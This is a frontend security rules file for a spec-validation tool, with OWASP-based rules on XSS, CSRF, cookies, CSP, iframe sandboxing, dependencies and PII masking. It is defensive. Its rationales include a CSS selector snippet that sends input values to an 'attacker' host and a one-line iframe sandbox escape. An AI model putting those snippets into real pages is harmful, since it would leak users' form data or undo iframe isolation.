# Security Rules — Frontend

Enforceable security rules for browser-side code, UI rendering, and client-server interaction. These rules apply to all projects with a web frontend adopting `govern`.

Rules use RFC 2119 language: **MUST** / **MUST NOT** are enforced by the validate command (errors); **SHOULD** / **SHOULD NOT** are flagged as warnings.

Rule IDs follow the format `FE-{CATEGORY}-{NNN}` and are permanent — once assigned, an ID is never renumbered, even if the rule is moved within the file or deprecated. Categories: `XSS` (cross-site scripting), `CSRF` (cross-site request forgery), `STORAGE` (secure client-side storage), `AUTHN` (authentication UX), `CSP` (content security policy), `DEPS` (dependency management), `PII` (sensitive data handling). See `specs/008-security-rules/data-model.md` for the full schema.

Projects without a frontend can pin this file in `.govern.toml` to skip it during `govern` updates.

## FE-XSS — Cross-Site Scripting Prevention

### FE-XSS-001

> All untrusted data rendered in HTML MUST be encoded for the specific output context (HTML body, HTML attribute, JavaScript, CSS, URL); a single encoding strategy MUST NOT be reused across contexts.

**Rationale:** Different parsing engines interpret characters differently. HTML encoding does not prevent XSS in JavaScript contexts; URL encoding does not prevent XSS in HTML attribute contexts. A single global "escape" step is structurally insufficient.

**Verification:** Any spec or plan that introduces user-rendered output (search keywords: `render`, `template`, `interpolate`, `display`, `html`) MUST name the output context for each rendered value and the matching encoding strategy. Validate flags rendering specs that describe a single global encode/escape step with no context distinction, and flags specs that bind untrusted data into JavaScript, CSS, or URL contexts without naming a context-specific encoder.

**Source:** OWASP XSS Prevention Cheat Sheet

### FE-XSS-002

> When the application uses a UI framework with automatic output encoding (React JSX, Angular templates, Vue templates), it MUST rely on the framework's auto-escaping as the primary XSS defense; explicit escape hatches (`dangerouslySetInnerHTML`, `bypassSecurityTrustHtml`, `v-html`) MUST be justified in the spec or plan and accompanied by a sanitization commitment.

**Rationale:** Framework auto-escaping covers the common case with minimal developer effort. Escape hatches bypass protection entirely — without sanitization, every escape-hatch usage is a potential XSS sink.

**Verification:** Any spec or plan that describes UI rendering with a framework MUST commit to using auto-escaping by default and MUST identify any planned escape-hatch usage with the sanitization strategy (e.g., DOMPurify) for that location. Validate flags rendering specs that name escape-hatch APIs (`dangerouslySetInnerHTML`, `bypassSecurityTrustHtml`, `v-html`, `innerHTML`-binding directives) without an accompanying sanitization commitment.

**Source:** OWASP XSS Prevention Cheat Sheet

### FE-XSS-003

> When manipulating the DOM with untrusted data, code MUST use safe assignment APIs (`.textContent`, `.setAttribute()` with allowlisted attributes, `element.value`) over unsafe alternatives (`.innerHTML`, `.outerHTML`, `eval()`, `document.write()`, `new Function(...)`); when `.innerHTML` is unavoidable, content MUST first be passed through a dedicated sanitization library (DOMPurify or equivalent).

**Rationale:** Unsafe DOM methods interpret string content as executable markup or code. Safe APIs treat strings as data. The default-safe path eliminates an entire class of injection sinks.

**Verification:** Any spec or plan that describes DOM manipulation, dynamic content insertion, or client-side rendering of fetched data MUST commit to safe-API usage as the default. Validate flags client-rendering specs that name `innerHTML`, `outerHTML`, `eval`, `document.write`, or `Function(...)` for untrusted-data sinks without an accompanying sanitization commitment.

**Source:** OWASP DOM-based XSS Prevention Cheat Sheet

### FE-XSS-004

> Inline `<script>` blocks and inline event-handler attributes (`onclick`, `onerror`, `onload`, etc.) SHOULD NOT be used; JavaScript SHOULD be loaded from external files or inlined behind a CSP nonce/hash so a strict Content Security Policy can be enforced.

**Rationale:** A strict CSP that disallows inline scripts is the single most effective XSS defense in depth — once an injection occurs, CSP prevents the injected `<script>` from executing. Inline scripts cannot be distinguished from injected scripts without nonces or hashes.

**Verification:** Any spec or plan that describes UI rendering or HTML response composition SHOULD commit to externalizing scripts and event handlers. Validate emits a warning when a frontend-rendering spec proposes inline scripts or HTML-attribute event handlers without naming a CSP nonce/hash strategy.

**Source:** OWASP CSP Cheat Sheet, MDN CSP documentation

### FE-XSS-005

> When the application renders user-authored markup (rich-text editors, markdown preview, comment systems with HTML), the rendered output MUST be passed through a dedicated HTML sanitization library configured with an explicit allowlist of tags and attributes; the sanitized output MUST NOT be modified after sanitization.

**Rationale:** Output encoding destroys intended formatting; sanitization preserves safe markup while stripping dangerous elements. Post-sanitization string manipulation can reintroduce vulnerabilities by reordering attributes, decoding entities, or concatenating fragments — re-running the sanitizer is the only safe pattern.

**Verification:** Any spec or plan that allows user-authored HTML, markdown rendering, or rich-text content MUST name the sanitization library (DOMPurify, sanitize-html, bleach, etc.) and the configured tag/attribute allowlist. Validate flags user-content specs that omit the sanitizer name, that propose hand-rolled regex sanitization, or that describe modifying the sanitizer's output before it reaches the DOM.

**Source:** OWASP XSS Prevention Cheat Sheet

### FE-XSS-006

> Untrusted URLs bound to `href`, `src`, `action`, `formaction`, or redirect targets MUST be validated against an explicit allowlist of acceptable schemes. The allowlist MUST NOT include `javascript:`, `data:`, `vbscript:`, or `blob:` for any URL whose value is influenced by user input. (`data:` and `blob:` may appear in narrowly scoped contexts where the URL is produced by application code over content the application controls — e.g., a `data:image/png;base64,…` thumbnail generated server-side — but never directly from user input.)

**Rationale:** `javascript:` URLs execute arbitrary code when navigated to or loaded. `data:` URLs can deliver scripted content via `text/html` or SVG payloads. `vbscript:` is a legacy IE vector still honored by some embedded WebViews. `blob:` URLs can wrap any MIME type including HTML/JS. Allowlisting acceptable schemes is the only durable defense — denylists miss new vectors as browsers add support for new URL types.

**Verification:** Any spec or plan that binds user-controlled values into URL-bearing attributes MUST commit to a project-defined scheme allowlist (e.g., `https:`, `mailto:`, `tel:`). Validate flags link-rendering, image-rendering, and redirect-handling specs that omit the scheme-allowlist commitment, and flags any allowlist that includes `javascript:`, `data:`, `vbscript:`, or `blob:` for user-influenced URLs.

**Source:** OWASP XSS Prevention Cheat Sheet

### FE-XSS-007

> Code that receives `window.postMessage` events MUST validate `event.origin` against an explicit allowlist before acting on `event.data`, and MUST treat `event.data` as untrusted input subject to the same validation, sanitization, and context-aware encoding rules as any other external input.

**Rationale:** `postMessage` listeners that act on `event.data` without origin checks are an XSS-equivalent vector — any page that gets loaded in an iframe, popup, or opener relation can post messages to the listener. Even with an origin check, the data itself is attacker-controlled and must be validated before, e.g., being assigned to `innerHTML` or used as a redirect target.

**Verification:** Any spec or plan that introduces `postMessage` consumers (iframe embeds, OAuth popup callbacks, widget bridges) MUST commit to (a) origin-allowlist validation and (b) data validation/encoding before use. Validate flags client-messaging specs that omit either check or that rely on wildcard origin checks.

**Source:** OWASP HTML5 Security Cheat Sheet, MDN postMessage documentation

### FE-XSS-008

> Applications running in browsers that support the Trusted Types API SHOULD adopt it as a defense in depth against DOM XSS. When adopted, the CSP MUST include `require-trusted-types-for 'script'` and a `trusted-types` directive naming the allowed policy names; sinks that accept strings (`innerHTML`, `outerHTML`, `document.write`, `eval`, `Function`, script `src`) MUST receive `TrustedHTML`/`TrustedScript`/`TrustedScriptURL` values produced by a reviewed policy, not raw strings.

**Rationale:** Trusted Types (Chromium-originated, increasingly cross-browser) shifts DOM XSS defense from "find every sink" to "centralize the sanitization." The CSP enforcement turns every unsanitized assignment into a runtime violation, surfacing latent sinks during development.

**Verification:** Any spec or plan covering rendering of dynamic HTML in a browser that supports Trusted Types SHOULD commit to adoption with the named CSP directives and policy-naming convention. Validate emits a warning when frontend rendering specs in Trusted-Types-capable contexts omit the adoption discussion.

**Source:** W3C Trusted Types specification, MDN Trusted Types documentation

## FE-CSRF — Cross-Site Request Forgery Prevention

### FE-CSRF-001

> All state-changing requests MUST be protected by either a synchronizer token (transmitted in a request body field or custom header and validated server-side) or a `SameSite=Strict` cookie pattern combined with a custom-header check; relying on `Origin`/`Referer` checks alone MUST NOT be the sole defense.

**Rationale:** CSRF attacks forge requests from the victim's browser. A synchronizer token validated server-side proves the request originated from the application's own UI. `SameSite=Strict` plus a custom-header requirement blocks the cross-site cookie inclusion path. Modern browsers' default-Lax behavior reduces — but does not eliminate — the need for an explicit defense; `Origin`/`Referer` checks are advisory because both headers can be absent on legitimate requests.

**Verification:** Any spec or plan that introduces state-changing endpoints MUST name the CSRF defense — a synchronizer token, double-submit cookie pattern, or `SameSite=Strict` cookie with a custom-header check. Validate flags state-changing endpoint specs that omit the CSRF question or that rely solely on `Origin`/`Referer` header checks without naming a cookie or token strategy.

**Source:** OWASP CSRF Prevention Cheat Sheet

### FE-CSRF-002

> Session and authentication cookies MUST set the `SameSite` attribute to `Lax` or `Strict`. `SameSite=None` MUST only be used when cross-site cookie transmission is explicitly required (e.g., third-party embed) and, when used, MUST be combined with `Secure` (without which modern browsers reject the cookie outright). Use of `SameSite=None` MUST be justified in the spec.

**Rationale:** SameSite restricts the browser from including cookies on cross-site requests, blocking the most common CSRF vector at the cookie layer. `SameSite=None` widens the attack surface — the cookie travels on cross-site requests and must be defended by a separate CSRF mechanism (per `FE-CSRF-001`).

**Verification:** Any spec or plan that introduces session cookies or auth cookies MUST name the `SameSite` value and, if `None`, MUST justify the cross-site requirement and confirm both `Secure` and the accompanying CSRF defense. Validate flags cookie-issuing specs that omit the `SameSite` attribute, that propose `SameSite=None` without justification, or that propose `SameSite=None` without `Secure`.

**Source:** OWASP CSRF Prevention Cheat Sheet

### FE-CSRF-003

> State-changing operations MUST NOT be exposed via HTTP `GET`; `GET` requests MUST be restricted to safe, idempotent reads.

**Rationale:** `GET` requests can be triggered by image tags, link prefetching, browser autocomplete, and shared URLs — all CSRF vectors and all cache-friendly. State-changing methods (`POST`, `PUT`, `PATCH`, `DELETE`) require an explicit form submission or scripted request, narrowing the trigger surface.

**Verification:** Any spec or plan that introduces an endpoint MUST name the HTTP method per operation and MUST NOT assign `GET` to any state-changing action. Validate flags endpoint specs whose `GET` handlers are described as creating, updating, or deleting state, or that conflate read and write under a single method.

**Source:** OWASP REST Security Cheat Sheet

## FE-STORAGE — Secure Client-Side Storage

### FE-STORAGE-001

> Secrets, API tokens, session tokens, refresh tokens, and credentials MUST NOT be stored in `localStorage`, `sessionStorage`, or IndexedDB; sensitive long-lived state MUST be held in `HttpOnly` cookies or in memory for the lifetime of the page.

**Rationale:** Browser storage APIs are accessible to any JavaScript running on the page, including injected scripts from XSS, malicious browser extensions, and bundle-tampering. A single XSS vulnerability exfiltrates every value in storage. `HttpOnly` cookies cannot be read by JavaScript at all.

**Verification:** Any spec or plan that describes client-side state, token handling, or session management MUST name the storage location for each sensitive value and MUST NOT assign tokens or credentials to `localStorage`, `sessionStorage`, or IndexedDB. Validate flags client-state specs that propose persisting tokens, secrets, or credentials in browser storage APIs without an enclosing encryption-with-server-key commitment.

**Source:** OWASP HTML5 Security Cheat Sheet, OWASP Session Management Cheat Sheet

### FE-STORAGE-002

> Session and authentication cookies MUST set `HttpOnly` (denies JavaScript access), `Secure` (requires HTTPS transit), and `SameSite=Lax` or `Strict` (limits cross-site transmission); the `Domain` attribute SHOULD NOT be set unless cross-subdomain sharing is explicitly required.

**Rationale:** Each attribute closes a specific attack vector: `HttpOnly` blocks XSS-based theft, `Secure` blocks plaintext interception, `SameSite` blocks CSRF, and omitting `Domain` confines the cookie to its exact origin (preventing subdomain hijacks).

**Verification:** Any spec or plan that introduces a session, authentication, or other privileged cookie MUST commit to setting all three required attributes and MUST justify any use of an explicit `Domain` value. Validate flags cookie-issuing specs that omit `HttpOnly`, `Secure`, or `SameSite`, or that set `Domain` without justification.

**Source:** OWASP Session Management Cheat Sheet

### FE-STORAGE-003

> Sensitive data (tokens, credentials, PII, session identifiers) MUST NOT appear in URL query parameters, fragment identifiers, or path segments.

**Rationale:** URLs are written to browser history, server access logs, referrer headers, proxy logs, browser sync services, and third-party analytics — every consumer of which is a potential exfiltration path. Sensitive values belong in request bodies or in headers (which are not logged by default).

**Verification:** Any spec or plan that describes how the client transmits sensitive values to the server MUST commit to request bodies or headers, not URL components. Validate flags client-server specs that bind tokens, credentials, session IDs, or PII into URL paths, query strings, or fragments.

**Source:** OWASP REST Security Cheat Sheet, OWASP Session Management Cheat Sheet

## FE-AUTHN — Authentication UX

### FE-AUTHN-001

> Post-authentication redirect destinations MUST be validated against an allowlist of internal application paths or hosts; open redirects (any user-controlled redirect target accepted without validation) MUST NOT be permitted.

**Rationale:** Open redirects are a phishing primitive — attackers craft links that hit the real login page (legitimate domain) and then bounce to attacker-controlled landing pages where credentials or session tokens can be harvested. Allowlist validation contains the redirect to known-safe destinations.

**Verification:** Any spec or plan that describes post-login redirects, "return to" URLs, OAuth callback handling, or any feature that accepts a destination URL from request parameters MUST name the allowlist (paths, hosts, signed-token validation). Validate flags login or OAuth flows that pass through a `next`/`return_to`/`redirect_uri` value without naming an allowlist or signature check.

**Source:** OWASP Unvalidated Redirects and Forwards Cheat Sheet

### FE-AUTHN-002

> When the user's session expires or is revoked, the application MUST surface a clear re-authentication prompt or redirect to the login page; the application MUST NOT silently fail, retry indefinitely, or leave the UI in a broken state.

**Rationale:** Silent failures confuse users into believing the application is broken, can mask data loss when a save attempt is rejected, and leave the user no path forward. Clear prompts give the user an explicit recovery action.

**Verification:** Any spec or plan that describes authenticated UI flows MUST name the session-expiration UX (redirect, modal prompt, banner with re-auth) and the data-preservation behavior for in-progress work. Validate flags authenticated-UI specs that omit session-expiration handling or that describe error states (e.g., "request fails") without naming the recovery path.

**Source:** OWASP Session Management Cheat Sheet

### FE-AUTHN-003

> The logout action MUST invalidate the session on the server, clear all client-side session cookies, and redirect to a public page; client-side-only logout (clearing cookies without server invalidation) MUST NOT be used.

**Rationale:** Client-only logout leaves the session valid on the server. Anyone who recovers the session ID — from a recently used shared device, network capture, or a second tab on a compromised machine — can continue using the session. Server invalidation makes the credential immediately unusable.

**Verification:** Any spec or plan that introduces logout, session termination, or "sign out everywhere" flows MUST commit to server-side session invalidation and explicit cookie clearing. Validate flags logout specs that describe only clearing cookies, calling `localStorage.clear`, or redirecting without naming the server invalidation step.

**Source:** OWASP Session Management Cheat Sheet

## FE-CSP — Content Security Policy

### FE-CSP-001

> All HTML responses MUST be served with a `Content-Security-Policy` HTTP header; CSP MUST be delivered via the response header and SHOULD NOT be delivered via `<meta>` tag alone (which cannot enforce `frame-ancestors`, reporting, or `sandbox`).

**Rationale:** CSP is the primary defense in depth against XSS. Header-delivered CSP applies before the browser parses any markup and supports the full directive set; `<meta>`-delivered CSP applies after the parser begins and supports only a subset. Header delivery is the only complete enforcement.

**Verification:** Any spec or plan that describes serving HTML responses or configuring the edge/web server MUST commit to a CSP header on every HTML response. Validate flags HTML-serving specs that omit a CSP commitment or that describe `<meta>`-only CSP delivery.

**Source:** OWASP CSP Cheat Sheet, MDN CSP documentation

### FE-CSP-002

> The CSP policy MUST use nonce-based or hash-based script restrictions. The policy MUST NOT include `'unsafe-inline'` or `'unsafe-eval'` in `script-src`, MUST NOT include `'unsafe-inline'` in `style-src` (nonce/hash or `'self'` only), and MUST include `object-src 'none'` and `base-uri 'none'` (or `'self'`).

**Rationale:** `'unsafe-inline'` in `script-src` permits any injected `<script>` to execute — defeating CSP's XSS protection. `'unsafe-eval'` permits string-to-code conversion (`eval`, `Function(...)`, `setTimeout(string, …)`). `'unsafe-inline'` in `style-src` enables CSS-based data exfiltration via attribute selectors (`input[value^="a"] { background: url(//attacker/a); }`) and clickjacking overlays via injected absolute-positioned styles. `object-src 'none'` blocks plugin- and `<embed>`-based content injection. `base-uri` lockdown prevents `<base>` tag injection from rerouting relative URLs to an attacker-controlled host.

**Verification:** Any spec or plan that defines a CSP policy MUST name the nonce/hash strategy for both scripts and styles and MUST commit to absence of `'unsafe-inline'`/`'unsafe-eval'` in `script-src`, absence of `'unsafe-inline'` in `style-src`, and explicit `object-src` and `base-uri` lockdown. Validate flags CSP specs that include any of the unsafe directives or that omit `object-src`/`base-uri` directives.

**Source:** OWASP CSP Cheat Sheet

### FE-CSP-003

> The CSP policy MUST include `frame-ancestors 'none'` (or `'self'` if same-origin framing is required); legacy `X-Frame-Options: DENY` SHOULD also be set as a fallback for browsers that do not honor `frame-ancestors`.

**Rationale:** Clickjacking attacks embed the application in an attacker-controlled iframe and trick users into interacting with the framed UI. `frame-ancestors` is the modern defense; `X-Frame-Options` covers older browsers that do not implement CSP Level 2.

**Verification:** Any spec or plan that describes serving HTML responses MUST commit to `frame-ancestors 'none'` or `'self'` in CSP and SHOULD commit to `X-Frame-Options: DENY` (or `SAMEORIGIN`). Validate flags HTML-serving specs that omit `frame-ancestors`, and emits a warning when `X-Frame-Options` is omitted.

**Source:** OWASP HTTP Headers Cheat Sheet, OWASP Clickjacking Defense Cheat Sheet

### FE-CSP-004

> The CSP policy SHOULD include `form-action 'self'` (or an explicit destination allowlist) to restrict where the browser will submit forms.

**Rationale:** Without `form-action`, an injected or compromised page fragment can submit forms to attacker-controlled servers — a phishing primitive that bypasses navigation-based defenses.

**Verification:** Any spec or plan that defines a CSP policy SHOULD include a `form-action` directive scoped to `'self'` or an explicit destination allowlist. Validate emits a warning when CSP specs omit `form-action`.

**Source:** OWASP CSP Cheat Sheet

### FE-CSP-005

> The CSP policy MUST include a reporting directive — `report-to` (preferred) with a matching `Reporting-Endpoints` header, and/or `report-uri` for backwards compatibility — pointing to an endpoint that ingests CSP violation reports. The receiving endpoint MUST be monitored so violations surface to the team responsible for the CSP, not silently dropped.

**Rationale:** A CSP without reporting is a black box: violations (which include both injection attempts and legitimate code that breaks under the policy) are visible only in browser devtools, where no one sees them. With reporting, the team learns about XSS attempts in production and about CSP regressions before users complain. Reporting is also the only safe way to roll out tighter policies via `Content-Security-Policy-Report-Only`.

**Verification:** Any spec or plan that defines a CSP policy MUST commit to a reporting directive and to an ingest path that surfaces reports to the responsible team. Validate flags CSP specs that omit both `report-to` and `report-uri`, and flags reporting-endpoint specs that describe writing reports to `/dev/null` or to storage no one watches.

**Source:** W3C CSP Level 3, OWASP CSP Cheat Sheet, MDN Reporting API

### FE-CSP-006

> Iframes embedding content the application does not fully control (third-party widgets, social-media embeds, user-supplied URLs, payment forms hosted elsewhere) MUST set the `sandbox` attribute with the minimum capabilities required for the embed to function. `sandbox=""` (full restrictions) is the floor; each token added (`allow-scripts`, `allow-same-origin`, `allow-forms`, etc.) MUST be justified. `allow-scripts` plus `allow-same-origin` together MUST NOT be used for cross-origin frames — that combination lets the framed page remove its own sandbox.

**Rationale:** Without `sandbox`, an embedded page runs with the same DOM/network capabilities as a top-level navigation — popups, downloads, top-frame navigation, plugin execution. The `sandbox` attribute is the only browser-level isolation primitive for iframes. The `allow-scripts` + `allow-same-origin` combination is a documented escape hatch — the framed page can use `parent.document.querySelector('iframe').removeAttribute('sandbox')` to undo the restriction.

**Verification:** Any spec or plan that introduces iframes embedding non-fully-controlled content MUST commit to a `sandbox` value and MUST justify each token included. Validate flags iframe specs that omit `sandbox`, that use it without naming the included tokens, or that combine `allow-scripts` with `allow-same-origin` on a cross-origin frame.

**Source:** OWASP HTML5 Security Cheat Sheet, MDN iframe sandbox documentation

### FE-CSP-007

> HTML responses MUST set the `Permissions-Policy` header (formerly `Feature-Policy`) restricting access to powerful browser features the application does not use. At minimum, features with privacy or security impact MUST be explicitly denied unless the application genuinely needs them: `camera=()`, `microphone=()`, `geolocation=()`, `payment=()`, `usb=()`, `interest-cohort=()`. Features the application uses MUST be scoped to `self` (or an explicit origin allowlist) rather than left open.

**Rationale:** Without `Permissions-Policy`, every embedded iframe and every script in the page can prompt the user for camera/microphone/geolocation access — including injected scripts after an XSS. The header turns the default-allow posture into default-deny per feature, dramatically narrowing what a successful injection can ask the user for. `interest-cohort=()` opts the site out of FLoC/Topics-style behavioral cohorts.

**Verification:** Any spec or plan that describes serving HTML responses MUST commit to a `Permissions-Policy` header naming the denied and allowed features. Validate flags HTML-serving specs that omit `Permissions-Policy`, that leave privacy-sensitive features unrestricted, or that grant features without an origin scope.

**Source:** W3C Permissions Policy specification, OWASP HTTP Headers Cheat Sheet, MDN Permissions-Policy documentation

## FE-DEPS — Dependency Management

### FE-DEPS-001

> Frontend dependencies MUST be scanned for known vulnerabilities on every CI run; dependencies with known critical or high-severity vulnerabilities MUST be updated, replaced, or accompanied by a documented exception with a remediation date.

**Rationale:** Frontend dependencies are an active and well-traveled supply-chain attack surface — a single compromised npm package can ship malicious code into production for every deploying project. Continuous scanning catches CVEs as they are disclosed; an explicit policy on findings ensures issues are addressed rather than buried.

**Verification:** Any spec or plan covering CI, build pipelines, or `system.md` MUST name the vulnerability scanner (Snyk, Dependabot, `npm audit`, `pnpm audit`, `yarn audit`, OWASP Dependency-Check) AND the policy on critical/high findings (fail the build, file an issue, alert on-call). Validate flags CI/dependency specs that omit either commitment.

**Source:** OWASP Dependency-Check, OWASP Top 10 (A06:2021 — Vulnerable and Outdated Components)

### FE-DEPS-002

> Third-party scripts and stylesheets loaded from cross-origin CDNs MUST include **both** the `integrity` attribute (with a valid Subresource Integrity hash) **and** the `crossorigin` attribute (typically `crossorigin="anonymous"`). Cross-origin scripts without integrity verification MUST NOT be loaded.

**Rationale:** CDN compromise, DNS hijacking, and registry tampering can replace a legitimate third-party asset with malicious content. SRI ensures the browser computes and verifies the asset's hash against the declared value before executing it. Without `crossorigin`, the browser cannot perform a CORS-mode fetch on cross-origin assets — SRI verification then fails open: the asset loads as opaque, the hash check is silently skipped, and the protection is gone. The two attributes MUST appear together.

**Verification:** Any spec or plan that describes loading scripts, stylesheets, or modules from external origins MUST commit to SRI **plus** `crossorigin` on every cross-origin asset and MUST commit to refusing to load assets without an integrity check. Validate flags HTML-template or build-output specs that name third-party CDNs, externally hosted scripts, or remotely loaded modules without naming both attributes.

**Source:** MDN Subresource Integrity documentation, W3C SRI specification, OWASP HTTP Headers Cheat Sheet

### FE-DEPS-003

> The application MUST NOT dynamically inject scripts from third-party origins at runtime without integrity verification; ad-hoc script element creation (`document.createElement('script')`) pointing at external URLs MUST be avoided unless the load is gated by a CSP-and-vendor-review process.

**Rationale:** Dynamically loaded scripts can change between page loads — a registry hash or build-time SRI value cannot be computed for content that varies per request. Combined with relaxed CSP entries (e.g., `script-src https:`), dynamic third-party loads create a permanent injection surface.

**Verification:** Any spec or plan that describes runtime third-party integrations (analytics, A/B testing, support widgets, embed providers) MUST commit to either bundling the third-party code with build-time SRI or to a CSP-and-vendor-review process for the runtime load. Validate flags integration specs that describe creating script elements pointing to external URLs without naming an integrity or CSP-trust commitment.

**Source:** OWASP CSP Cheat Sheet

### FE-DEPS-004

> Production frontend dependencies MUST be pinned to specific versions (or version + integrity hash) in the lockfile used for production builds; floating versions (`latest`, `^`, `~`, range constraints) MUST NOT determine what ships to production.

**Rationale:** Floating versions admit supply-chain attacks via a compromised release of a dependency, and make production debugging guesswork — the same `package.json` resolves to different versions on different days. Pinned versions in `package-lock.json`, `pnpm-lock.yaml`, or `yarn.lock` plus an explicit upgrade process keep deployments deterministic and auditable. This rule mirrors `BE-DEPS-002` for the frontend toolchain.

**Verification:** Any spec or plan covering frontend builds, deployment, or `system.md` MUST commit to (a) an authoritative lockfile (`package-lock.json`, `pnpm-lock.yaml`, `yarn.lock`) included in the deployment artifact and (b) a documented upgrade process. Validate flags deployment specs that allow floating dependency ranges in production builds, that omit the lockfile question, or that describe `npm install` (vs. `npm ci`) for production-build determinism.

**Source:** OWASP A06:2021, npm/pnpm/yarn lockfile documentation

## FE-PII — Sensitive Data Handling

### FE-PII-001

> When personally identifiable information is rendered in the UI, the value MUST be masked or partially redacted unless the full value is required for the user's task; reveal-on-demand interactions (click-to-reveal, hover-with-delay) MUST require an explicit user action.

**Rationale:** Shoulder surfing, screenshots, screen sharing, and over-the-shoulder support sessions can expose PII rendered in full. Masking limits the exposure surface while preserving the value's identifying utility (last four digits of a phone, masked email, redacted SSN).

**Verification:** Any spec or plan that introduces UI surfaces displaying PII, financial data, or government IDs MUST name the masking strategy (which characters are visible, which are redacted) and any reveal mechanism. Validate flags UI specs that render full PII fields without a masking commitment or reveal-on-demand interaction.

**Source:** OWASP Input Validation Cheat Sheet, NIST SP 800-122

### FE-PII-002

> Forms collecting credentials, multi-factor codes, and payment data MUST set the appropriate `autocomplete` token (`current-password`, `new-password`, `cc-number`, `one-time-code`, etc.) so browsers and password managers can offer autofill, breached-password warnings, and generated passwords; blanket `autocomplete="off"` on credential and payment fields MUST NOT be used as the default posture.

**Rationale:** Modern guidance reverses the older "always autocomplete=off" advice. Browsers ignore `autocomplete=off` on password fields by default, and properly tokenized fields enable password managers to participate — which materially reduces credential reuse, weak password choice, and phishing exposure. `off` is appropriate only for narrow, justified cases (one-time code reentry on shared kiosks, sensitive search inputs).

**Verification:** Any spec or plan that introduces credential, MFA, or payment forms MUST name the `autocomplete` token per field. Validate flags form specs that set `autocomplete="off"` blanketly across credential or payment inputs without justification, and flags credential forms that omit the `autocomplete` question entirely.

**Source:** OWASP Authentication Cheat Sheet, MDN HTML attribute: autocomplete, NIST SP 800-63B

### FE-PII-003

> Pages displaying sensitive data MUST set `Cache-Control: no-store` to prevent browser, intermediate, and shared caching; the logout response SHOULD additionally include `Clear-Site-Data: "cache", "cookies", "storage"` to evict client-side artifacts.

**Rationale:** Cached responses persist on disk and can be recovered after the session ends — by another user on a shared machine, a forensic analyst, or anyone with disk access. `Clear-Site-Data` instructs the browser to evict all locally stored artifacts at logout, closing the post-session leakage window.

**Verification:** Any spec or plan that describes authenticated pages or logout flows MUST commit to `Cache-Control: no-store` on sensitive responses and SHOULD commit to `Clear-Site-Data` on logout. Validate flags authenticated-page specs that omit `Cache-Control: no-store` and emits a warning when logout flows omit `Clear-Site-Data`.

**Source:** OWASP Session Management Cheat Sheet, MDN Cache-Control / Clear-Site-Data documentation
